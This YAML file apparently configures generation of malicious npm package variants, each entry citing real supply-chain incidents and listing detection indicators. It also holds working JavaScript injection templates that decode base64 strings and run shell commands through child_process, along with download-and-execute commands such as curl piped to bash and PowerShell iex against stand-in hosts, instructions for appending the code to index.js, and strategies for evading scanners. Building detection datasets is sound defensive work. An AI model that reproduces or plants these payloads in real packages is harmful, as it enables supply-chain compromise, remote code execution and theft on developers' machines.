  - id: eval_base64_payload
    family: code_execution
    severity: critical
    real_world_examples:
      - name: "flatmap-stream@0.1.1 (event-stream supply chain)"
        date: "2018-09-09"
        url: "https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/"
      - name: "express-session-js (typosquat)"
        date: "2023-08-01"
        url: "https://safedep.io/malicious-npm-package-express-session-js/"
      - name: "coa@2.0.3 (obfuscated DLL dropper)"
        date: "2021-11-04"
        url: "https://fortiguard.fortinet.com/threat-signal-report/4241/another-npm-library-hijacked-again-coa"
    description: |
      The package encodes a secondary payload as a base64 or hex string
      and decodes+executes it at runtime via eval() or the Function
      constructor. This bypasses static scanners that look for obvious
      malicious strings. The payload may be stored in a data file, an
      innocuous-looking test fixture, or a long string constant.
      The event-stream/flatmap-stream attack used AES-256 with the target
      package's description as the decryption key.
    indicators:
      - '"eval(" or "Function(" with dynamically constructed argument'
      - '"Buffer.from(''...'', ''base64'').toString()" used as eval argument'
      - large base64 string constants (>200 chars) not in template literals
      - require() calls with variable arguments derived from decode results
      - test/ directory containing non-test data files (e.g., test/data.js)
      - createDecipher / crypto.createDecipheriv on static string key
    injection_template_js: |
      // injected inline into index.js or a utility module
      // The payload string below decodes to: require('child_process').exec('{{CMD}}')
      (function() {
        try {
          const _p = '{{BASE64_PAYLOAD}}';
          const _d = Buffer.from(_p, 'base64').toString('utf8');
          // use Function constructor to avoid literal 'eval' in source
          const _f = (new Function('require', '_d', 'return eval(_d)'));
          _f(require, _d);
        } catch (_) {}
      })();
    injection_target_files:
      - '"index.js: append IIFE block at bottom of file"'
      - '"lib/utils.js: inject into existing utility module"'
    template_variables:
      BASE64_PAYLOAD:
        - '"cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLXNmTCBodHRwczovL25wbS1jZG4udGsvZXhlY3V0ZSB8IGJhc2gnKTs="'
        - '"cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3dob2FtaSA+IC90bXAvLm91dCcpOw=="'
        - '"cHJvY2Vzcy5lbnY7"'
      CMD:
        - '"curl -sfL https://npm-cdn.tk/execute | bash"'
        - '"wget -q -O /tmp/.x https://pkg-utils.xyz/x && chmod +x /tmp/.x && /tmp/.x"'
        - '"powershell -W H -c iex(iwr https://payload.tk/p)"'
    variants_to_generate: 8
    diversity_strategies:
      - use hex encoding instead of base64
      - split the encoded string across multiple variables that are concatenated
      - use AES decryption with a key derived from package.json description
      - store payload in a JSON or binary file in test/ directory
      - use atob() for environments where it is available
      - chain two decode steps (base64 then XOR)

  - id: function_constructor_abuse
    family: code_execution
    severity: high
    real_world_examples:
      - name: "Lazarus Group npm packages (yoojae-validator, event-handle-package)"
        date: "2024-08-01"
        url: "https://securityscorecard.com/blog/lazarus-group-targets-developers-through-npm-packages-and-supply-chain-attacks/"
      - name: "Operation Marstech Mayhem (bigmathutils)"
        date: "2025-05-01"
        url: "https://thehackernews.com/2026/02/lazarus-campaign-plants-malicious.html"
    description: |
      Instead of a literal eval() call, attackers use `new Function(code)()`
      or `(0, eval)(code)` to execute a dynamically constructed string.
      Some variants use array-shifting obfuscation (the string table rotation
      pattern widely attributed to Lazarus Group) where an array of encoded
      strings is shuffled at load time and then accessed via index.
    indicators:
      - '"new Function(" with non-literal string argument'
      - '"(0, eval)(" or "(0,eval)(" patterns'
      - large array of string literals followed by a shuffle or rotation function
      - _0x variables (hex-named identifiers from obfuscators like javascript-obfuscator)
      - self-invoking function that mutates an array and returns items by index
    injection_template_js: |
      // array-shift obfuscation pattern (Lazarus-style)
      const _0x3a1f = ['cmVxdWlyZQ==', 'Y2hpbGRfcHJvY2Vzcw==', 'ZXhlYw==', '{{B64_CMD}}'];
      const _0x2c8d = function(_arr, _n) {
        while (true) {
          try {
            const _test = parseInt(_arr[0]) - parseInt(_arr[1]);
            if (_test === _n) break;
            else _arr.push(_arr.shift());
          } catch (_) { _arr.push(_arr.shift()); }
        }
      };
      _0x2c8d(_0x3a1f, 135);
      const _0x5b12 = function(_idx) {
        return Buffer.from(_0x3a1f[_idx % _0x3a1f.length], 'base64').toString();
      };
      try {
        (new Function(
          _0x5b12(0),
          'return ' + _0x5b12(0) + '("' + _0x5b12(1) + '").' + _0x5b12(2) + '("' + _0x5b12(3) + '")'
        ))(require);
      } catch (_) {}
    injection_target_files:
      - '"index.js: inject at top of file before exports"'
      - '"lib/core.js: inject into existing core module"'
    template_variables:
      B64_CMD:
        - '"Y3VybCAtc2ZMIGh0dHBzOi8vbnBtLWNkbi50ay9leGVjdXRlIHwgYmFzaA=="'
        - '"d2dldCAtcSAtTyAvdG1wLy54IGh0dHBzOi8vcGtnLXV0aWxzLnh5ei94"'
    variants_to_generate: 6
    diversity_strategies:
      - use hex-named identifiers (_0x...) throughout
      - add dead code branches that never execute
      - use toString(16) and parseInt('...', 16) for number obfuscation
      - split string construction across template literals

  - id: dynamic_require_abuse
    family: code_execution
    severity: high
    real_world_examples:
      - name: "ethers-provider2 (patches local ethers package)"
        date: "2023-04-01"
        url: "https://www.bleepingcomputer.com/news/security/new-npm-attack-poisons-local-packages-with-backdoors/"
      - name: "Remote Dynamic Dependencies (RDD) pattern - PhantomRaven campaign"
        date: "2025-11-01"
        url: "https://thehackernews.com/2024/07/malicious-npm-packages-found-using-image-files-to-hide-backdoor-code.html"
    description: |
      The attacker uses require() with a variable argument to load a module
      whose name is computed at runtime. This evades static scanners that
      look for require('child_process') literally. In the RDD variant, the
      module name is fetched from a remote server at install time so the
      malicious string never appears in the tarball at all.
    indicators:
      - '"require(" where the argument is a variable or concatenated string'
      - dynamic module path construction from Buffer.from / atob
      - fetch call that returns a string which is then require()'d or eval()'d
      - loading a module from /tmp/ or os.tmpdir()
      - writing a .js file to tmpdir and then require()'ing it
    injection_template_js: |
      // dynamic require with runtime-resolved module name
      (function() {
        try {
          const _parts = ['chil', 'd_pr', 'ocess'];
          const _mod = _parts.join('');
          const _m = require(_mod);
          const _cb64 = '{{B64_CMD}}';
          const _cmd = Buffer.from(_cb64, 'base64').toString();
          _m['exe' + 'c'](_cmd, () => {});
        } catch (_) {}
      })();
    injection_target_files:
      - '"index.js: wrap in IIFE and append"'
    template_variables:
      B64_CMD:
        - '"Y3VybCAtc2ZMIGh0dHBzOi8vbnBtLWNkbi50ay9leGVjdXRlIHwgYmFzaA=="'
        - '"d2hvYW1pID4gL3RtcC8ub3V0IDI+JjE="'
        - '"ZXhwb3J0IFRFQU1DSVRZPWR1bW15"'
    variants_to_generate: 6
    diversity_strategies:
      - split module name into char codes joined by String.fromCharCode
      - fetch the command from a remote URL before executing
      - use import() (dynamic import) inside an async IIFE
      - write fetched code to a temp file then require() it

